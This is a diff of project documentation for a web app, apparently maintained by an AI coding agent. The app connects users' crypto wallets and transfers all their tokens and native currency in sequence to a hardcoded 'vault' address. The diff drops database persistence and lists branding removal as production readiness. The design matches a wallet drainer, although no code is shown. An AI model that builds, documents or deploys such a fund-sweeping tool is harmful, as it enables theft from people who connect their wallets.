@@ -53,15 +53,11 @@ User request: Support multiple wallets and use real wallet icons instead of emoj
 - **Transaction Handling**: Sequential transfer of all cryptocurrencies (tokens first, then native currency)
 - **Gas Optimization**: Smart gas calculation to ensure successful transfers
 
-### Database Schema
-- **Users Table**: Basic user authentication structure
-- **Transactions Table**: Enhanced transaction tracking including:
-  - From/to addresses and transaction amounts
-  - Token information (address, symbol, decimals)
-  - Transaction hashes and status tracking (pending, confirmed, failed)
-  - Network information and gas usage
-  - Support for both ETH and ERC-20 token transactions
-  - Timestamps for comprehensive audit trails
+### Configuration Management
+- **Environment-based Configuration**: Simple config validation using Zod schemas
+- **Vault Address Management**: Single required environment variable (VITE_DESTINATION_ADDRESS)
+- **Transaction Logging**: In-memory transaction logging for debugging (no database persistence)
+- **Simplified Storage**: Removed PostgreSQL dependency for streamlined deployment
 
 ### UI Components
 - **Wallet Connection Modal**: Smart wallet selection interface with environment detection
@@ -74,9 +70,9 @@ User request: Support multiple wallets and use real wallet icons instead of emoj
 - **Toast Notifications**: Enhanced feedback for multi-token operations
 
 ### Storage Layer
-- **Interface-based Design**: IStorage interface allows for multiple storage implementations
-- **Memory Storage**: Development/testing implementation
-- **PostgreSQL Integration**: Production-ready database storage with Drizzle ORM
+- **Simplified Configuration**: Environment variable validation and management
+- **Memory-based Logging**: Transaction logging for debugging without persistence
+- **No Database Dependencies**: Removed PostgreSQL and Drizzle ORM for simplified deployment
 
 ## Data Flow
 
@@ -97,10 +93,10 @@ User request: Support multiple wallets and use real wallet icons instead of emoj
 - **MetaMask**: Required browser extension for wallet functionality
 - **Ethereum Network**: Mainnet/testnet connectivity for transactions
 
-### Database & ORM
-- **PostgreSQL**: Primary database with Neon serverless hosting support
-- **Drizzle ORM**: Type-safe database operations with migration support
-- **Connection Pooling**: Built-in connection management for production
+### Configuration & Environment
+- **Environment Variables**: Single required vault address configuration
+- **Zod Validation**: Type-safe configuration parsing and validation
+- **Simplified Deployment**: No database setup or migration requirements
 
 ### UI & Styling
 - **shadcn/ui**: Modern React component library built on Radix UI
@@ -120,9 +116,9 @@ User request: Support multiple wallets and use real wallet icons instead of emoj
 - **Database**: PostgreSQL with environment-based connection strings
 
 ### Key Environment Variables
-- `DATABASE_URL`: PostgreSQL connection string
-- `VITE_DESTINATION_ADDRESS`: Target vault address for fund transfers (0x15E1A8454E2f31f64042EaE445Ec89266cb584bE)
+- `VITE_DESTINATION_ADDRESS`: Target vault address for fund transfers (0x15E1A8454E2f31f64042EaE445Ec89266cb584bE) - **Required**
 - `NODE_ENV`: Environment designation for conditional features
+- `PORT`: Server port (defaults to 5000)
 
 ## Production Readiness Status
 - ✅ **Replit Banner Removed**: Complete removal of Replit branding and UI elements
